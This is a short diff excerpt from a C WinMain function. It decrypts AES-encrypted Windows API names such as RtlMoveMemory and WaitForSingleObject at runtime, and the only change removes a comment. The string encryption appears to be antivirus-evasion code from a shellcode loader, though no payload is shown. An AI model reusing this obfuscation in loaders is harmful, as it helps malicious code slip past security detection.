@@ -159,7 +159,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
 	AESDecrypt((char *)WaitForSingleObjectEnc, sizeof(WaitForSingleObjectEnc), (char *)key, sizeof(key));
 	WaitForSingleObjectEnc[19] = '\0';
 
-	unsigned char RtlMoveMemoryEnc[] = { 0xd, 0x4f, 0xde, 0x32, 0xe5, 0x1e, 0xa8, 0xfc, 0x4a, 0x2, 0xfd, 0x6d, 0x46, 0x8f, 0x3b, 0xea }; //0d bad char?
+	unsigned char RtlMoveMemoryEnc[] = { 0xd, 0x4f, 0xde, 0x32, 0xe5, 0x1e, 0xa8, 0xfc, 0x4a, 0x2, 0xfd, 0x6d, 0x46, 0x8f, 0x3b, 0xea };
 	AESDecrypt((char *)RtlMoveMemoryEnc, sizeof(RtlMoveMemoryEnc), (char *)key, sizeof(key));
 	RtlMoveMemoryEnc[13] = '\0';
 	
